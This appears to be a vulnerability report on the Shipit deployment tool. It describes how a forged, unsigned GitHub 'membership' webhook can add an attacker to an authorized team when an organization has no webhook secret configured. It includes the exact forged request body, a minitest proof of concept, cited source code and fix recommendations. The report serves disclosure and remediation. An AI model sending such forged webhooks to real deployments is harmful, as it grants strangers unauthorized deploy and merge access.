Binding claimed broken: "a `Membership` row for team `T` (`T ∈ Shipit.github_teams`) == a membership that GitHub actually reports for `T`." I traced the full path and confirmed the equality is genuinely broken under the documented "no webhook_secret" configuration.

## Title
Unauthenticated forged `membership` webhook escalates arbitrary attacker into `Shipit.github_teams` authorization — ([File: app/controllers/shipit/webhooks_controller.rb], [File: lib/shipit/github_app.rb], [File: app/models/shipit/webhooks/handlers/membership_handler.rb])

## Summary
`GithubApp#verify_webhook_signature` returns `true` unconditionally whenever an organization's `webhook_secret` is blank, which `docs/setup.md` documents as an allowed/optional configuration. Combined with `MembershipHandler#process`, which trusts the raw webhook `team.id`/`member.login` and looks the team up only by `github_id` with no cross-check against the verified organization, an unauthenticated attacker who knows the numeric GitHub `team.id` of a team already listed in `Shipit.github_teams` can POST a forged `membership` webhook and grant themselves membership in that authorization-relevant team, without GitHub ever having reported such a membership.

## Finding Description
The broken binding: `Membership(user: attacker, team: T)` should exist **iff** GitHub actually reports `attacker` as a member of GitHub team `T`. After the exploit, the row exists in Shipit's database while GitHub was never consulted.

Path:
1. `WebhooksController#verify_signature` computes `repository_owner` from `params.dig('organization','login')` and calls `Shipit.github(organization: repository_owner).verify_webhook_signature(...)`. [1](#0-0) [2](#0-1) 
2. `GithubApp#verify_webhook_signature` short-circuits to `true` when `webhook_secret` is absent — this is the root-cause line. [3](#0-2) 
This precondition is explicitly documented as optional/permitted: `docs/setup.md` says "Webhook secret (optional)" and multiple shipped example config files (`config/secrets.development.example.yml`, `test/dummy/config/secrets.test.json`, `test/dummy/config/secrets_double_github_app.yml`) ship with `webhook_secret: nil`.
3. `MembershipHandler#process` looks up/creates the team purely by `github_id: params.team.id` (the GitHub team ID from the untrusted payload), with no verification that `params.organization.login` matches the team's real `organization`, and no re-query of GitHub to confirm the membership actually exists: [4](#0-3) 
4. `Team#add_member` then persists a `Membership` row directly from the forged payload: [5](#0-4) 
5. `Shipit.github_teams` resolves the configured `oauth.teams` handles into `Team` AR rows via `find_or_create_by_handle`: [6](#0-5) 
6. `User#authorized?` checks membership against those exact `Team` AR rows by primary key `id`: [7](#0-6) 
Because `MembershipHandler` resolves the same underlying `Team` row via `github_id` (the same row `Shipit.github_teams` resolved via handle), forging a membership for that `github_id` grants the attacker `Membership` in the exact `Team` row checked by `authorized?`, satisfying `force_github_authentication`'s gate: [8](#0-7) 

Attacker's exact request: `POST /webhooks` with header `X-Github-Event: membership`, no valid `X-Hub-Signature` needed, and JSON body:
```json
{
  "action": "added",
  "team": {"id": <github_id of an existing authorized Team>, "name": "x", "slug": "x", "url": "https://example.com"},
  "organization": {"login": "<org with blank webhook_secret>"},
  "member": {"login": "<attacker-login>"}
}
```

Why existing guards fail:
- `verify_signature` is defeated by design once `webhook_secret` is blank — there is no additional check (e.g., IP allowlist, replay protection, mandatory secret).
- `drop_unhandled_event` does not block `membership`, since it's a registered handler.
- The `ExplicitParameters` schema only validates types/presence of `team.id`, `organization.login`, `member.login` — it never cross-validates `organization.login` against the found team's stored `organization`, nor does it call back into GitHub to confirm the reported membership.
- `find_or_create_by!(github_id: ...)` matches on attacker-supplied data; it doesn't scope by `organization`.

## Impact Explanation
A successful request creates a real `Membership(user: attacker, team: T)` row for any `T` already used in `Shipit.github_teams`/`oauth.teams`, causing `current_user.authorized?` to return `true` for the attacker. This is a full authentication/authorization bypass into Shipit's access-control gate (`force_github_authentication`), letting an unprivileged internet user gain access equivalent to being an organization team member — including whatever stacks, deploys, rollbacks and merge actions that authorization unlocks throughout the app. It is repeatable against any organization configured without a `webhook_secret`, and against any team whose numeric `github_id` the attacker can learn (team IDs are often discoverable via GitHub's public API for teams the attacker can see, or via the org's public app/webhook history). Blast radius is confined to organizations sharing that specific misconfiguration, but within that organization it is a full escalation into the trusted-team set. This matches the documented High-severity category: "escalation into `Shipit.github_teams` authorization."

## Likelihood Explanation
Preconditions: (a) at least one configured GitHub organization in `secrets.yml`/`credentials` has no `webhook_secret` — a state explicitly permitted by `docs/setup.md` and present in several shipped example/test configs; (b) the attacker knows that organization's login (public) and the numeric GitHub `team.id` of a team listed in `oauth.teams` (often discoverable, sometimes guessable via small integer ranges). Attacker cost is a single unauthenticated HTTP POST, no secrets, tokens or GitHub App credentials required. It is fully repeatable and does not require any race condition or timing dependency.

## Recommendation
- Require a non-blank `webhook_secret` for every configured GitHub organization; refuse to boot (or refuse all webhook processing) for organizations with a blank secret, rather than silently trusting unsigned payloads.
- In `MembershipHandler`, cross-check `params.organization.login` against the team's stored `organization` before mutating membership, and/or re-verify the membership against the GitHub API (`Shipit.github(organization:).api`) rather than trusting the webhook body alone for security-relevant `Team`/`Membership` writes.
- Consider treating `Shipit.github_teams` membership as a hard security boundary that is not solely governed by webhook-sourced `Membership` rows without corroboration.

## Proof of Concept
minitest plan (added to `test/controllers/webhooks_controller_test.rb`-style test):
```ruby
test "unauthenticated membership webhook escalates attacker into Shipit.github_teams when webhook_secret is blank" do
  team = shipit_teams(:shopify_developers) # already resolvable via Shipit.github_teams handle config
  Shipit.github(organization: 'shopify').stubs(:webhook_secret).returns(nil) # documented-permitted config

  attacker = 'attacker_login'
  payload = {
    action: 'added',
    team: { id: team.github_id, name: team.name, slug: team.slug, url: team.api_url },
    organization: { login: 'shopify' },
    member: { login: attacker }
  }.to_json

  request.headers['X-Github-Event'] = 'membership'
  # No X-Hub-Signature header set at all -- request is otherwise fully unauthenticated

  assert_difference -> { Shipit::Membership.count }, 1 do
    post :create, body: payload, as: :json
    assert_response :ok
  end

  user = Shipit::User.find_by!(login: attacker)
  assert Shipit::Membership.exists?(user_id: user.id, team_id: team.id)
  # Equality check both sides:
  # LHS: Membership row exists for (attacker, team) in Shipit DB
  # RHS: GitHub was never queried/asked to confirm this membership (no Octokit call stubbed/expected)
  assert user.authorized?, "attacker gained Shipit.github_teams authorization without any real GitHub confirmation"
end
```

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L22-43)
```ruby
        def process
          team = find_or_create_team!
          member = User.find_or_create_by_login!(params.member.login)

          case params.action
          when 'added'
            team.add_member(member)
          when 'removed'
            team.members.delete(member)
          else
            raise ArgumentError, "Don't know how to perform action: `#{action.inspect}`"
          end
        end

        private

        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
        end
```

**File:** app/models/shipit/team.rb (L41-43)
```ruby
    def add_member(member)
      members.append(member) unless members.include?(member)
    end
```

**File:** lib/shipit.rb (L256-258)
```ruby
  def github_teams
    @github_teams ||= github.oauth_teams.map { |t| Team.find_or_create_by_handle(t) }
  end
```

**File:** app/models/shipit/user.rb (L80-82)
```ruby
    def authorized?
      @authorized ||= Shipit.github_teams.empty? || teams.where(id: Shipit.github_teams.map(&:id)).exists?
    end
```

**File:** app/controllers/concerns/shipit/authentication.rb (L20-34)
```ruby
    def force_github_authentication
      if current_user.logged_in? && current_user.requires_fresh_login?
        Rails.logger.warn("User #{current_user.id} requires a fresh login, logging out...")
        reset_session
        redirect_to(Shipit::Engine.routes.url_helpers.github_authentication_path(origin: request.original_url))
      elsif Shipit.authentication_disabled? || current_user.logged_in?
        unless current_user.authorized?
          team_handles = Shipit.github_teams.map(&:handle)
          team_list = team_handles.to_sentence(two_words_connector: ' or ', last_word_connector: ', or ')
          render(plain: "You must be a member of #{team_list} to access this application.", status: :forbidden)
        end
      else
        redirect_to(Shipit::Engine.routes.url_helpers.github_authentication_path(origin: request.original_url))
      end
    end
```
